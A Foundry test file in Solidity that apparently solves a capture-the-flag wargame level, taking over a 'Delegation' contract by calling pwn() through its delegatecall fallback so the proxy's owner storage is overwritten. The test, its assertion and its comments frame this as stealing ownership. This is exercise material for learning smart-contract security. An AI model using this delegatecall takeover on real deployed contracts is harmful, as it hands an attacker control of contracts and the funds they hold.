// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Delegate} from "../src/delegate.sol";
import {Delegation} from "../src/delegation.sol";

contract DelegateTest is Test {
    Delegate public delegate;
    Delegation public delegation;
    address NewOwner = makeAddr('NewOwner');
    address Owner = makeAddr('Owner');


    function setUp() public {
        delegate = new Delegate(Owner);
        delegation = new Delegation(address(delegate));

    }

    function test_stealownership() public {
        vm.startPrank(NewOwner);
        Delegate delegateNew = Delegate(address(delegation));
        delegateNew.pwn();
        assertEq(NewOwner, delegation.owner());
        vm.stopPrank();
        
        // assertEq(delegate.owner(), Owner);

        // vm.prank(NewOwner);
        // delegation.pwn();

        // assertEq(delegate.owner(), NewOwner);


    }
}

// Deploy the implementation contract
// Steal ownership from the ownership contract 